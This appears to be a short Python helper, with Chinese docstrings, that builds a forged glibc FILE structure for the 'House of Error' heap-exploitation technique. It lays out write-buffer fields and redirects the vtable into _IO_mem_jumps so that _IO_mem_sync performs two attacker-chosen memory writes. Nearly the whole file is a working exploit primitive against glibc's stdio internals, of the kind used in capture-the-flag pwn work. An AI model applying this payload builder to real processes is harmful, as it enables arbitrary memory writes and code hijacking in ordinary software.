"""House of Error _IO_mem_sync field plan."""
from dataclasses import dataclass

@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str

def _p(v: int) -> bytes:
    if not isinstance(v, int) or not 0 <= v < 1 << 64: raise ValueError("address must fit uint64")
    return v.to_bytes(8, "little")

def build_house_of_error(*, file_addr: int, mem_jumps_addr: int,
                         bufloc_addr: int, sizeloc_addr: int,
                         write_base_addr: int, write_length: int) -> tuple[MemoryWrite, ...]:
    """生成 `_IO_mem_sync` 双写消费点。

    file_addr: 真实/伪造 FILE 地址；mem_jumps_addr: `_IO_mem_jumps` 地址。
    bufloc_addr/sizeloc_addr: 两个被写入的目标地址。
    write_base_addr: `_IO_write_base`，第一次写入的值。
    write_length: `_IO_write_ptr - _IO_write_base`，第二次写入的 size 值。
    """
    if write_length <= 0 or write_length >= 1 << 64: raise ValueError("write_length must be positive")
    image = bytearray(0x100)
    image[0x20:0x28] = _p(write_base_addr)
    image[0x28:0x30] = _p(write_base_addr + write_length)
    image[0x30:0x38] = _p(write_base_addr + write_length + 1)
    image[0xd8:0xe0] = _p(mem_jumps_addr + 0x38)  # sync(0x60) - uflow(0x28)
    image[0xf0:0xf8] = _p(bufloc_addr)
    image[0xf8:0x100] = _p(sizeloc_addr)
    return (MemoryWrite(file_addr, bytes(image), "memstream FILE + mem_sync vtable"),)
